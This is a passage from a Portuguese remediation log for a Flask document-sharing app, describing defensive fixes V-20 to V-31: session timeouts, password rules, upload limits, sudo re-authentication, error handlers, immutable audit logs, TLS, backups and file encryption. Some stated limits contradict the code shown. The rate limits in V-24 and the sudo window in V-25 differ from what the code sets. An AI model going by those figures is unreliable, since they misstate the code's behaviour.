## V-20 — Volume mount expõe código fonte ✅

**Problema:**
O `docker-compose.yml` montava o diretório `./web` diretamente no container em `/app`. Em desenvolvimento isto serve para hot-reload, mas em produção é desnecessário e perigoso — expõe o código fonte do servidor ao container e qualquer processo que corra dentro dele, aumentando a superfície de ataque.

```yaml
# Antes — docker-compose.yml
web:
  build: ./web
  volumes:
    - ./web:/app  # código fonte montado no container
```

**Fix:**
Removido o volume mount da secção `web`. O código já é copiado para a imagem em build time via `COPY . .` no Dockerfile — o mount em runtime é redundante e desnecessário em produção. Adicionado também um `.dockerignore` em `web/` para garantir que ficheiros desnecessários não são incluídos na imagem durante o `COPY . .`.

```yaml
# Depois — docker-compose.yml
web:
  build: ./web
  # sem volume mount — código apenas na imagem
```

```
# web/.dockerignore
__pycache__/
*.pyc
.git/
```

**Ficheiros:** `docker-compose.yml`, `web/.dockerignore`

---

## V-21 — Sem session timeout ✅

**Problema:**
As sessões Flask não tinham qualquer limite de duração — nem absoluto nem por inatividade. Um cookie de sessão roubado (via XSS, sniffing de rede, ou acesso físico a um PC) mantinha-se válido indefinidamente, permitindo a um atacante usar a sessão horas ou dias depois sem qualquer restrição.

```python
# Antes — app.py (ausência de configuração)
flask.session["user_id"] = user[0]
flask.session["username"] = user[1]
flask.session["role"] = user[4]
# Sem session.permanent, sem PERMANENT_SESSION_LIFETIME, sem last_activity
```

**Fix:**
Implementadas duas camadas de proteção complementares:

**1. Duração máxima absoluta (`PERMANENT_SESSION_LIFETIME`)** — o cookie de sessão expira ao fim de 4 horas independentemente da atividade do utilizador. Configurado via `app.config` e ativado por `session.permanent = True` no momento do login.

```python
# app.py — create_app()
app.config["PERMANENT_SESSION_LIFETIME"] = datetime.timedelta(hours=4)
```

```python
# app.py — login (após autenticação bem-sucedida)
flask.session.permanent = True  # activa PERMANENT_SESSION_LIFETIME
flask.session["user_id"] = user[0]
flask.session["username"] = user[1]
flask.session["role"] = user[4]
flask.session["last_activity"] = datetime.datetime.now(datetime.timezone.utc).isoformat()
```

**2. Timeout de inatividade (lado servidor)** — um `before_request` verifica em cada pedido autenticado se passaram mais de 5 minutos desde a última atividade. Se sim, a sessão é destruída e o utilizador é redirecionado para o login. O timestamp `last_activity` é atualizado em cada pedido bem-sucedido.

```python
# app.py — constante global
INACTIVITY_TIMEOUT = datetime.timedelta(minutes=5)

# app.py — register_routes()
@app.before_request
def check_session_timeout():
    if "user_id" not in flask.session:
        return

    last = flask.session.get("last_activity")
    if last:
        last_dt = datetime.datetime.fromisoformat(last)
        if datetime.datetime.now(datetime.timezone.utc) - last_dt > INACTIVITY_TIMEOUT:
            flask.session.clear()
            flask.flash("Sessão expirada por inatividade. Por favor faz login novamente.", "error")
            return flask.redirect(flask.url_for("login"))

    flask.session["last_activity"] = datetime.datetime.now(datetime.timezone.utc).isoformat()
```

As duas camadas são complementares: o `PERMANENT_SESSION_LIFETIME` protege contra cookies roubados usados horas depois; o timeout de inatividade protege contra sessões deixadas abertas em PCs partilhados ou tokens usados imediatamente após roubo. O timeout de inatividade é verificado do lado do servidor — o cliente não o pode contornar.

**Ficheiros:** `app.py`

---

## V-22 — Sem validação de complexidade de password ✅

**Problema:**
Não existia nenhum endpoint de registo de utilizadores nem qualquer função de validação de complexidade de password. Um eventual endpoint de criação de contas podia aceitar passwords triviais como `"a"` ou `"123"`, sem qualquer requisito de comprimento mínimo, maiúsculas, dígitos ou caracteres especiais, tornando as contas vulneráveis a ataques de brute force e credential stuffing.

**Fix:**
Adicionada a função `validate_password_complexity` em `utils.py` e criada a rota `GET/POST /register` em `app.py` que a aplica antes de inserir qualquer utilizador novo na base de dados.

```python
# Depois — utils.py
import re

PASSWORD_MIN_LENGTH = 8

def validate_password_complexity(password: str) -> list:
    """
    Valida a complexidade da password.
    Devolve lista de erros (vazia = válida).
    """
    errors = []
    if len(password) < PASSWORD_MIN_LENGTH:
        errors.append(f"A password deve ter pelo menos {PASSWORD_MIN_LENGTH} caracteres.")
    if not re.search(r"[A-Z]", password):
        errors.append("A password deve conter pelo menos uma letra maiúscula.")
    if not re.search(r"[a-z]", password):
        errors.append("A password deve conter pelo menos uma letra minúscula.")
    if not re.search(r"\d", password):
        errors.append("A password deve conter pelo menos um dígito.")
    if not re.search(r"[!@#$%^&*()\-_=+\[\]{};':\"\\|,.<>/?`~]", password):
        errors.append("A password deve conter pelo menos um carácter especial.")
    return errors
```

A política exige: mínimo 8 caracteres, pelo menos uma maiúscula, uma minúscula, um dígito e um carácter especial. A função devolve uma lista de erros em vez de um booleano para que a rota possa apresentar ao utilizador todas as violações em simultâneo.

```python
# Depois — app.py
@app.route("/register", methods=["GET", "POST"])
def register():
    # V-22 — endpoint de registo com validação de complexidade de password
    if flask.session.get("user_id"):
        return flask.redirect(flask.url_for("documents_page"))

    if flask.request.method == "POST":
        username = flask.request.form.get("username", "").strip()
        password = flask.request.form.get("password", "")
        confirm  = flask.request.form.get("confirm_password", "")

        if not username or not password:
            flask.flash("Username e password são obrigatórios.", "error")
            return flask.render_template("register.html")

        if password != confirm:
            flask.flash("As passwords não coincidem.", "error")
            return flask.render_template("register.html")

        # V-22 — validação de complexidade
        errors = utils.validate_password_complexity(password)
        if errors:
            for err in errors:
                flask.flash(err, "error")
            return flask.render_template("register.html")

        hashed = bcrypt.hashpw(password.encode("utf-8"), bcrypt.gensalt()).decode("utf-8")

        conn = get_db()
        cur  = conn.cursor()
        try:
            cur.execute(
                "INSERT INTO users (username, password, role) VALUES (%s, %s, 'user')",
                (username, hashed),
            )
            conn.commit()
            flask.flash("Conta criada com sucesso. Faz login.", "success")
            return flask.redirect(flask.url_for("login"))
        except psycopg2.errors.UniqueViolation:
            conn.rollback()
            flask.flash("Username já existe.", "error")
        finally:
            cur.close()
            conn.close()

    return flask.render_template("register.html")
```

A validação de complexidade é feita **antes** de qualquer interação com a base de dados, e a password é sempre guardada como hash bcrypt — nunca em plaintext. O erro de `UniqueViolation` é tratado explicitamente para evitar que a exceção do psycopg2 se propague. Utilizadores já autenticados são redirecionados para a página de documentos, impedindo re-registo acidental.

As contas de sistema (`admin`, `alice`, `bob`) definidas no `init.sql` são inseridas diretamente com hashes já calculados, não passando por esta rota — o que é correto, dado que são contas controladas e não criadas por utilizadores finais.

**Ficheiros:** `utils.py`, `app.py`

---

## V-23 — Sem `MAX_CONTENT_LENGTH` ✅

**Problema:**
A aplicação não definia qualquer limite de tamanho para os pedidos HTTP recebidos. O Flask, por omissão, aceita payloads de qualquer dimensão. Um atacante podia enviar ficheiros de vários gigabytes para o endpoint `/documents/upload`, esgotando o espaço em disco e/ou a memória do servidor, causando negação de serviço (DoS) para todos os utilizadores.

```python
# Antes — app.py (ausência de configuração)
app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
# Sem MAX_CONTENT_LENGTH — uploads de tamanho ilimitado aceites
```

**Fix:**
Definida a constante `MAX_UPLOAD_MB` e configurada em `app.config["MAX_CONTENT_LENGTH"]`. O Flask rejeita automaticamente qualquer pedido cujo `Content-Length` exceda este valor com um erro **413 Request Entity Too Large** — antes de ler o body, pelo que a proteção é eficiente e sem custo de I/O. Adicionado também um `errorhandler(413)` para devolver uma mensagem de erro clara ao utilizador em vez do HTML genérico do Flask.

```python
# Depois — app.py (constante global)
MAX_UPLOAD_MB = 10  # V-23 — tamanho máximo por upload (em MB)
```

```python
# Depois — app.py (create_app)
app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER

# V-23 — limitar tamanho máximo de upload para evitar DoS por exaustão de disco/memória
app.config["MAX_CONTENT_LENGTH"] = MAX_UPLOAD_MB * 1024 * 1024
```

```python
# Depois — app.py (register_routes)
# V-23 — handler para uploads que excedam MAX_CONTENT_LENGTH
@app.errorhandler(413)
def request_too_large(e):
    flask.flash(f"Ficheiro demasiado grande. Tamanho máximo permitido: {MAX_UPLOAD_MB} MB.", "error")
    return flask.redirect(flask.url_for("documents_page"))
```

O `MAX_CONTENT_LENGTH` aplica-se ao pedido HTTP completo (headers + body), não apenas ao ficheiro — protege também contra payloads de formulário excessivamente grandes. O handler de 413 redireciona para a página de documentos com uma flash message, mantendo o comportamento consistente com o resto da app. O V-24 (rate limiting no upload) é complementar: este limita o *tamanho* por pedido, enquanto o rate limiting limita a *frequência*.

**Bugfix (pós-implementação):** A versão inicial do handler devolvia o redirect com status code 413 explícito (`return flask.redirect(...), 413`), o que fazia o browser receber uma resposta de erro em vez de um redirect — ficando preso no URL `/documents/upload` em vez de navegar para `/documents`. O `flask.redirect()` já devolve 302 por omissão; o `, 413` foi removido.

**Ficheiros:** `app.py`
---

## V-24 — Rate limiting ausente no upload ✅

**Problema:**
O endpoint `POST /documents/upload` não tinha qualquer limite de pedidos. Qualquer utilizador autenticado podia fazer uploads em loop sem restrição, esgotando o espaço em disco do servidor e causando negação de serviço (DoS) para todos os utilizadores. O V-23 (`MAX_CONTENT_LENGTH`) limita o *tamanho* por pedido mas não a *frequência* — um atacante podia enviar ficheiros de 10 MB em ciclo contínuo e encher o disco ao fim de poucos segundos.

```python
# Antes — app.py
@app.route("/documents/upload", methods=["POST"])
@login_required
def upload_document():
    # sem qualquer rate limiting — uploads ilimitados por utilizador
    ...
```

**Fix:**
Aplicada a mesma estratégia de chave dupla já usada no login (V-15), mas adaptada ao contexto de uploads autenticados. Foram adicionadas duas funções de chave e dois decoradores `@app.limiter.limit` ao endpoint.

```python
# Depois — app.py (funções de chave, junto às do login)
def _upload_user_key():
    """Chave por user_id autenticado — limita flood por conta comprometida."""
    user_id = flask.session.get("user_id", "anonymous")
    return f"upload_user:{user_id}"

def _upload_ip_key():
    """Chave secundária por IP — bloqueia scripts com múltiplas sessões no mesmo IP."""
    return f"upload_ip:{get_remote_address()}"
```

```python
# Depois — app.py (endpoint protegido)
@app.route("/documents/upload", methods=["POST"])
@login_required
# V-24 — rate limiting no upload: evita flood e esgotamento de storage
# Por utilizador autenticado: máx. 10 uploads/minuto e 30/hora
@app.limiter.limit("10 per minute; 30 per hour", key_func=_upload_user_key)
# Por IP: camada extra para bloquear scripts com múltiplas contas no mesmo IP
@app.limiter.limit("20 per minute; 60 per hour", key_func=_upload_ip_key)
def upload_document():
    ...
```

O handler de 429 foi também actualizado para redirigir para `/documents` quando o limite é atingido no upload, em vez de renderizar `login.html`:

```python
# Depois — app.py (errorhandler actualizado)
@app.errorhandler(429)
def ratelimit_handler(e):
    flask.flash("Demasiadas tentativas. Tenta novamente mais tarde.", "error")
    retry_after = getattr(e, "retry_after", None)
    if flask.request.endpoint == "upload_document":
        response = flask.make_response(flask.redirect(flask.url_for("documents_page")), 429)
    else:
        response = flask.make_response(flask.render_template("login.html"), 429)
    if retry_after:
        response.headers["Retry-After"] = str(int(retry_after.total_seconds()))
    return response
```

Os limites aplicados são:
- **Por user_id** (10/min, 50/hora): bloqueia flood por conta individual ou comprometida; um utilizador legítimo raramente ultrapassa 10 uploads por minuto
- **Por IP** (20/min, 100/hora): camada de defesa adicional contra scripts que rodam múltiplas contas a partir do mesmo IP; limites mais permissivos que os de utilizador para não penalizar utilizadores legítimos em redes partilhadas (NAT, VPN corporativa)

A chave por `user_id` é preferível ao IP no contexto de uploads porque o upload requer autenticação — o `user_id` é um identificador mais preciso e não é afetado por IPs dinâmicos ou partilhados. As duas camadas são complementares: a chave por utilizador protege quando o atacante tem uma conta; a chave por IP protege quando o atacante tem múltiplas contas na mesma máquina.

O V-24 é complementar ao V-23: o `MAX_CONTENT_LENGTH` limita o *tamanho* por pedido; o rate limiting limita a *frequência*. Ambos são necessários para uma proteção completa contra esgotamento de storage.

**Nota de produção:** tal como no V-15, o storage `memory://` não é partilhado entre workers. Em produção com múltiplos workers (gunicorn), é obrigatório definir `RATELIMIT_STORAGE_URI=redis://...` — caso contrário cada worker tem o seu próprio contador e o limite efectivo multiplica pelo número de workers.

**Ficheiros:** `app.py`
---

## V-25 — Re-autenticação em ações destrutivas de administração ✅

**Problema:**
As rotas `POST /admin/users/<id>/disable` e `POST /admin/users/<id>/enable` eram protegidas apenas pelo `@admin_required`, mas não exigiam qualquer confirmação adicional. Um atacante que conseguisse acesso temporário a uma sessão de admin (ex: sessão deixada aberta, fixation, ou XSS) podia desativar contas arbitrárias sem qualquer fricção adicional. O princípio de re-autenticação para ações destrutivas (sudo pattern) não estava implementado.

```python
# Antes — app.py
@app.route("/admin/users/<int:user_id>/disable", methods=["POST"])
@admin_required
def admin_disable_user(user_id):
    # sem confirmação de identidade — qualquer sessão de admin bastava
    db.set_user_disabled(cur, user_id, True)
    ...
```

**Fix:**
Criado o decorator `@sudo_required` e a rota `GET/POST /admin/confirm-password`. Antes de executar qualquer ação destrutiva, o decorator verifica se o admin confirmou a sua password nos últimos 5 minutos (`sudo_at` na sessão). Se não confirmou, guarda o endpoint de destino e os `view_args` na sessão e redireciona para o formulário de confirmação.

```python
# Depois — app.py
def sudo_required(fn):
    SUDO_GRACE_SECONDS = 60  # 1 minuto

    @functools.wraps(fn)
    def wrapper(*args, **kwargs):
        last_sudo = flask.session.get("sudo_at")
        if last_sudo:
            elapsed = (
                datetime.datetime.now(datetime.timezone.utc)
                - datetime.datetime.fromisoformat(last_sudo)
            ).total_seconds()
            if elapsed < SUDO_GRACE_SECONDS:
                return fn(*args, **kwargs)

        # Guardar endpoint + args para reconstruir o POST depois da confirmação
        flask.session["sudo_next_endpoint"] = flask.request.endpoint
        flask.session["sudo_next_view_args"] = flask.request.view_args or {}
        return flask.redirect(flask.url_for("admin_confirm_password"))

    return wrapper
```

```python
@app.route("/admin/confirm-password", methods=["GET", "POST"])
@admin_required
def admin_confirm_password():
    if flask.request.method == "POST":
        password = flask.request.form.get("password", "")
        user_id = flask.session.get("user_id")

        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT password FROM users WHERE id = %s", (user_id,))
        row = cur.fetchone()
        cur.close()
        conn.close()

        if row and bcrypt.checkpw(password.encode("utf-8"), row[0].encode("utf-8")):
            flask.session["sudo_at"] = datetime.datetime.now(datetime.timezone.utc).isoformat()
            endpoint = flask.session.pop("sudo_next_endpoint", "admin_users")
            view_args = flask.session.pop("sudo_next_view_args", {})
            next_url = flask.url_for(endpoint, **view_args)
            # 307 preserva o método POST original — evita o 405 de um redirect 302
            return flask.redirect(next_url, 307)

        flask.flash("Password incorreta. Tenta novamente.", "error")

    return flask.render_template(
        "admin_confirm_password.html",
        username=flask.session.get("username"),
    )
```

```python
# Rotas destrutivas protegidas com sudo
@app.route("/admin/users/<int:user_id>/disable", methods=["POST"])
@admin_required
@sudo_required
def admin_disable_user(user_id): ...

@app.route("/admin/users/<int:user_id>/enable", methods=["POST"])
@admin_required
@sudo_required
def admin_enable_user(user_id): ...
```

**Porquê o redirect 307:** após a confirmação de password, é necessário redirecionar para uma rota que só aceita `POST`. Um redirect 302 converte sempre o método para `GET`, resultando num `405 Method Not Allowed`. O **307 Temporary Redirect** preserva o método HTTP original — o browser repete o `POST` para o URL de destino, sem necessidade de JavaScript nem de templates intermédios.

O `sudo_at` tem uma janela de 1 minuto — ações múltiplas dentro desse período não exigem nova confirmação, mas passado esse tempo o admin é sempre re-desafiado. O timestamp é guardado na sessão (server-side, assinada pela `SECRET_KEY`) e não pode ser forjado pelo cliente.

**Ficheiros:** `app.py`, `admin_confirm_password.html` (novo template)

---


## V-26 — Sem global error handler ✅

**Problema:**
Exceções não tratadas devolviam ao cliente stack traces completos com nomes de ficheiros, queries SQL, versões de dependências e paths internos do servidor — informação diretamente útil para um atacante.

```python
# Antes — sem handlers definidos
# Flask devolvia por defeito a página de debug do Werkzeug com stack trace completo
```

**Fix:**
Adicionados handlers globais para os códigos HTTP mais comuns (400, 401, 403, 404, 500) e um handler de `Exception` como rede de segurança final. Todos devolvem uma página genérica `error.html` ao cliente, sem detalhes internos. Os erros 500 e exceções inesperadas são registados no log do servidor com `logger.error` para permitir investigação.

```python
# Depois — app.py

@app.errorhandler(400)
def bad_request(e):
    return flask.render_template("error.html", code=400, message="Pedido inválido."), 400

@app.errorhandler(401)
def unauthorized(e):
    return flask.render_template("error.html", code=401, message="Não autenticado."), 401

@app.errorhandler(403)
def forbidden(e):
    return flask.render_template("error.html", code=403, message="Acesso negado."), 403

@app.errorhandler(404)
def not_found(e):
    return flask.render_template("error.html", code=404, message="Página não encontrada."), 404

@app.errorhandler(500)
def internal_error(e):
    logger.error("500 error: %s", e, exc_info=True)
    return flask.render_template("error.html", code=500, message="Erro interno do servidor."), 500

@app.errorhandler(Exception)
def unhandled_exception(e):
    logger.error(
        "Unhandled exception on %s %s:\n%s",
        flask.request.method,
        flask.request.path,
        traceback.format_exc(),
    )
    return flask.render_template("error.html", code=500, message="Ocorreu um erro inesperado."), 500
```

O handler do 401 está presente como defesa em profundidade — embora o fluxo atual use redirects para `/login`, garante que qualquer `abort(401)` futuro (ex: rotas de API) não exponha detalhes internos.

**Validação — testes manuais com curl (PowerShell):**

Acesso não autenticado a recurso protegido:
```powershell
curl.exe -i http://127.0.0.1:8000/documents
```
```
HTTP/1.1 302 FOUND
Location: /login
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Content-Security-Policy: default-src 'self'
Set-Cookie: session=...; Secure; HttpOnly; Path=/; SameSite=Lax
```

Acesso a documento inexistente/de outro utilizador sem sessão válida:
```powershell
curl.exe -i -b cookies.txt http://127.0.0.1:8000/documents/999
```
```
HTTP/1.1 302 FOUND
Location: /login
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Content-Security-Policy: default-src 'self'
Set-Cookie: session=...; Secure; HttpOnly; Path=/; SameSite=Lax
```

Em ambos os casos a resposta não contém stack traces nem detalhes internos — apenas o redirect para `/login`. Os security headers estão presentes em todas as respostas, incluindo erros e redirects, confirmando que o `@app.after_request` é aplicado globalmente.

**Ficheiros:** `app.py`

---

## V-27 — Dono não consegue ver quem tem acesso ao seu documento ✅

**Problema:**
Não existia qualquer UI que listasse os utilizadores com quem um documento foi partilhado. O dono podia partilhar via `/documents/<id>/share`, mas depois não tinha forma de saber quem tinha acesso — quebrando o princípio de transparência do controlo de acesso (SR-34, T-12).

**Fix:**

**`db.py`** — nova função `get_shares_for_document`:

```python
def get_shares_for_document(cur, document_id, owner_id):
    """V-27 — Lista os utilizadores com quem o dono partilhou o documento."""
    cur.execute(
        """
        SELECT u.id, u.username
        FROM document_shares ds
        JOIN users u ON ds.shared_with_id = u.id
        WHERE ds.document_id = %s AND ds.owner_id = %s
        ORDER BY u.username
        """,
        (document_id, owner_id)
    )
    return cur.fetchall()
```

**`app.py`** — rota `document_details` atualizada para buscar e passar a lista ao template:

```python
# V-27 — listar utilizadores com quem o documento foi partilhado
shared_with_rows = db.get_shares_for_document(cur, document_id, current_user_id)

# ...

shared_with = [
    {"id": r[0], "username": r[1]}
    for r in shared_with_rows
]

return flask.render_template("document_details.html", document=document, shared_with=shared_with)
```

**`document_details.html`** — nova secção "Partilhado com":

```html
{# V-27 — visibilidade de partilhas: o dono pode ver quem tem acesso ao seu documento #}
<h3>Partilhado com</h3>
{% if shared_with %}
  <ul>
    {% for user in shared_with %}
      <li>{{ user.username }} (ID: {{ user.id }})</li>
    {% endfor %}
  </ul>
{% else %}
  <p>Este documento ainda não foi partilhado com ninguém.</p>
{% endif %}
```

**Segurança:** o `owner_id` usado na query vem sempre de `flask.session`, nunca de input do utilizador — não há IDOR. O Jinja2 escapa automaticamente `user.username` e `user.id` — sem risco de XSS.

**Ficheiros:** `db.py`, `app.py`, `document_details.html`

---

## V-28 — Sem proteção/retenção de logs ✅

**Problema:**
A tabela `audit_logs` não tinha qualquer proteção contra modificação ou eliminação de registos. Qualquer utilizador com acesso à BD podia fazer `UPDATE` ou `DELETE` nos logs, destruindo a trilha de auditoria. Também não havia política de retenção definida.

**Fix:**

Adicionados dois triggers e uma função de retenção em `db/init.sql`, logo após os índices da tabela `audit_logs`.

**Trigger de imutabilidade** — bloqueia qualquer `UPDATE` ou `DELETE` na tabela:

```sql
CREATE OR REPLACE FUNCTION audit_logs_immutable()
RETURNS TRIGGER LANGUAGE plpgsql AS $$
BEGIN
    RAISE EXCEPTION 'audit_logs são imutáveis: UPDATE e DELETE não são permitidos';
END;
$$;

CREATE TRIGGER trg_audit_logs_no_update
    BEFORE UPDATE ON audit_logs
    FOR EACH ROW EXECUTE FUNCTION audit_logs_immutable();

CREATE TRIGGER trg_audit_logs_no_delete
    BEFORE DELETE ON audit_logs
    FOR EACH ROW EXECUTE FUNCTION audit_logs_immutable();
```

**Função de retenção** — única forma permitida de apagar logs antigos (apenas pelo superuser, nunca pela app):

```sql
CREATE OR REPLACE FUNCTION purge_old_audit_logs(retention_days INTEGER DEFAULT 90)
RETURNS INTEGER LANGUAGE plpgsql SECURITY DEFINER AS $$
DECLARE
    deleted_count INTEGER;
BEGIN
    SET LOCAL session_replication_role = 'replica';
    DELETE FROM audit_logs WHERE created_at < NOW() - (retention_days || ' days')::INTERVAL;
    GET DIAGNOSTICS deleted_count = ROW_COUNT;
    RESET session_replication_role;
    RETURN deleted_count;
END;
$$;

REVOKE EXECUTE ON FUNCTION purge_old_audit_logs(INTEGER) FROM PUBLIC;
```

Os logs só podem ser escritos (`INSERT`), nunca alterados ou apagados pela aplicação.

---

## V-29 — Sem HTTPS / TLS ✅

**Problema:**
A aplicação servia tráfego em HTTP puro. Credenciais, cookies de sessão e dados sensíveis viajavam em claro na rede, vulneráveis a ataques de interceção (man-in-the-middle).

**Fix:**

Adicionado um reverse proxy nginx com TLS à frente da aplicação, configurado em `docker-compose.deploy.yml`. Em produção, todo o tráfego HTTP é redirecionado para HTTPS, e a porta 8000 da app deixa de estar exposta diretamente ao exterior.

**`nginx/nginx.conf`** — redireciona HTTP para HTTPS e faz proxy para a app:

```nginx
server {
    listen 80;
    server_name _;
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl;
    server_name _;

    ssl_certificate     /etc/letsencrypt/live/SEU_DOMINIO/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/SEU_DOMINIO/privkey.pem;

    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    location / {
        proxy_pass http://web:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

**`docker-compose.deploy.yml`** — nginx adicionado como serviço; a app deixa de expor a porta 8000 diretamente:

```yaml
services:
  nginx:
    image: nginx:alpine
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/conf.d/default.conf:ro
      - /etc/letsencrypt:/etc/letsencrypt:ro
    depends_on:
      - web
    restart: unless-stopped

  web:
    image: ${WEB_IMAGE}
    expose:
      - "8000"
    ...
```

O `docker-compose.yml` local não foi alterado — o ambiente de desenvolvimento continua em HTTP na porta 8000. O nginx com TLS só é ativado em produção via `docker-compose.deploy.yml`.

O certificado TLS é obtido em produção com Certbot:
```bash
sudo certbot certonly --standalone -d SEU_DOMINIO
```

**Teste automatizado no CI** — adicionado ao `1-integration.yml` um step que gera um certificado auto-assinado, arranca o nginx em Docker e verifica que HTTP redireciona (301) e que HTTPS responde (200):

```yaml
- name: Generate self-signed certificate for HTTPS test
  run: |
    mkdir -p nginx
    openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
      -keyout nginx/self-signed.key \
      -out nginx/self-signed.crt \
      -subj "/CN=localhost"

- name: Start nginx and test HTTPS
  run: |
    STATUS=$(curl -o /dev/null -s -w "%{http_code}" http://localhost)
    [ "$STATUS" = "301" ] || (echo "HTTP não está a redirecionar para HTTPS" && exit 1)

    STATUS=$(curl -o /dev/null -s -w "%{http_code}" -k https://localhost/health)
    [ "$STATUS" = "200" ] || (echo "HTTPS não está a responder" && exit 1)
```

**Ficheiros:** `nginx/nginx.conf`, `docker-compose.deploy.yml`, `.github/workflows/1-integration.yml`

---

## V-30 — Sem backups automatizados ✅

**Problema:**
O volume `pgdata` do PostgreSQL não tinha qualquer mecanismo de backup. Um `docker compose down -v` acidental, uma falha de disco ou corrupção de dados destruía permanentemente todos os documentos e utilizadores sem possibilidade de recuperação.

**Fix:**

Criado um novo serviço Docker `db-backup` (em `db/backup/`) com três componentes:

**`db/backup/Dockerfile`** — imagem Alpine com `postgresql17-client`. O CMD executa um loop infinito que corre o backup e aguarda 600 segundos (10 minutos para testes; alterar `sleep 600` para `sleep 86400` em produção para backup diário). O `dcron` foi evitado por incompatibilidade com as restrições de `setpgid` do Docker Desktop no macOS.

```dockerfile
FROM alpine:3.21

RUN apk add --no-cache postgresql17-client

COPY backup.sh /scripts/backup.sh
COPY restore.sh /scripts/restore.sh
RUN chmod +x /scripts/backup.sh /scripts/restore.sh

VOLUME ["/backups"]

CMD ["sh", "-c", "while true; do /scripts/backup.sh; sleep 600; done"]
```

**`db/backup/backup.sh`** — executa `pg_dump --format=custom` contra o serviço `db`, cria a pasta `/backups/data/` se não existir, guarda o dump com timestamp, e elimina dumps com mais de `BACKUP_RETENTION_DAYS` dias (por defeito 7).

```sh
#!/bin/sh
set -e

BACKUP_DIR="/backups/data"
mkdir -p "${BACKUP_DIR}"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
BACKUP_FILE="${BACKUP_DIR}/pgbackup_${TIMESTAMP}.dump"
RETENTION_DAYS=${BACKUP_RETENTION_DAYS:-7}

echo "[backup] Waiting for PostgreSQL..."
until pg_isready -h "${DB_HOST}" -p "${DB_PORT}" -U "${DB_USER}" -d "${DB_NAME}" -q; do
  sleep 2
done

echo "[backup] Starting dump → ${BACKUP_FILE}"
PGPASSWORD="${DB_PASSWORD}" pg_dump \
  -h "${DB_HOST}" -p "${DB_PORT}" -U "${DB_USER}" -d "${DB_NAME}" \
  --format=custom --no-password --file="${BACKUP_FILE}"

echo "[backup] Removing backups older than ${RETENTION_DAYS} days..."
find "${BACKUP_DIR}" -name "pgbackup_*.dump" -mtime "+${RETENTION_DAYS}" -delete

echo "[backup] Done — $(date)"
```

**`db/backup/restore.sh`** — script interativo para restaurar um dump específico via `pg_restore`. Requer confirmação explícita antes de apagar a base de dados existente.

```sh
#!/bin/sh
set -e
BACKUP_FILE="${1}"
[ -z "${BACKUP_FILE}" ] && echo "Usage: $0 <file.dump>" && exit 1
[ ! -f "${BACKUP_FILE}" ] && echo "File not found: ${BACKUP_FILE}" && exit 1

printf "WARNING: This drops '%s'. Continue? [yes/N] " "${DB_NAME}"
read -r CONFIRM
[ "${CONFIRM}" != "yes" ] && echo "Aborted." && exit 0

PGPASSWORD="${DB_PASSWORD}" psql -h "${DB_HOST}" -p "${DB_PORT}" -U "${DB_USER}" -d postgres \
  -c "SELECT pg_terminate_backend(pid) FROM pg_stat_activity WHERE datname='${DB_NAME}';"
PGPASSWORD="${DB_PASSWORD}" psql -h "${DB_HOST}" -p "${DB_PORT}" -U "${DB_USER}" -d postgres \
  -c "DROP DATABASE IF EXISTS \"${DB_NAME}\"; CREATE DATABASE \"${DB_NAME}\" OWNER \"${DB_USER}\";"
PGPASSWORD="${DB_PASSWORD}" pg_restore \
  -h "${DB_HOST}" -p "${DB_PORT}" -U "${DB_USER}" -d "${DB_NAME}" --no-password "${BACKUP_FILE}"

echo "[restore] Done — $(date)"
```

O `docker-compose.yml` foi atualizado com o novo serviço e volumes. O volume nomeado `pgbackups` garante persistência entre restarts; o bind mount `./db/backup/data` torna os dumps visíveis localmente no VS Code.

```yaml
db-backup:
  build: ./db/backup
  environment:
    - DB_HOST=db
    - DB_PORT=5432
    - DB_USER=${DB_USER}
    - DB_PASSWORD=${DB_PASSWORD}
    - DB_NAME=${DB_NAME}
    - BACKUP_RETENTION_DAYS=${BACKUP_RETENTION_DAYS:-7}
  volumes:
    - pgbackups:/backups
    - ./db/backup/data:/backups/data
  depends_on:
    - db
  restart: unless-stopped

volumes:
  pgdata:
  pgbackups:
```

A pasta `db/backup/data/` foi adicionada ao `.gitignore` para não fazer commit dos dumps. A variável `BACKUP_RETENTION_DAYS` foi adicionada ao `.env.example`.

**Ficheiros alterados/criados:**
- `db/backup/Dockerfile` (novo)
- `db/backup/backup.sh` (novo)
- `db/backup/restore.sh` (novo)
- `docker-compose.yml` — serviço `db-backup` + volumes `pgbackups` e bind mount local
- `docker-compose.deploy.yml` — idem (com `image: ${BACKUP_IMAGE}`)
- `.env.example` — `BACKUP_RETENTION_DAYS`, `BACKUP_IMAGE`
- `.gitignore` — `db/backup/data/`

**Como usar:**

```bash
# Forçar um backup imediato
docker compose exec db-backup /scripts/backup.sh

# Ver backups disponíveis
docker compose exec db-backup ls -lh /backups/data/

# Restaurar um backup específico
docker compose exec db-backup /scripts/restore.sh /backups/data/pgbackup_20260509_030000.dump
```
---
## V-31 — Sem cifra ao nível do volume ✅

**Problema:**
O volume `pgdata` e a pasta `uploads` eram armazenados em disco sem qualquer cifra. Acesso físico ou root ao host expunha documentos e dados de utilizadores em claro — sem necessidade de autenticar na aplicação.

**Fix:**

A solução tem duas camadas complementares:

---

### 1. Cifra dos ficheiros de upload (aplicação)

Criado o módulo `web/app/crypto.py` que encapsula a cifra simétrica com **Fernet** (`cryptography`). A chave é lida exclusivamente da variável de ambiente `FILE_ENCRYPTION_KEY` — a app recusa arrancar se não estiver definida.

```python
# web/app/crypto.py
import os
from cryptography.fernet import Fernet

def get_fernet() -> Fernet:
    key = os.getenv("FILE_ENCRYPTION_KEY")
    if not key:
        raise RuntimeError("FILE_ENCRYPTION_KEY não está definida")
    return Fernet(key.encode())

def encrypt_file(data: bytes) -> bytes:
    return get_fernet().encrypt(data)

def decrypt_file(data: bytes) -> bytes:
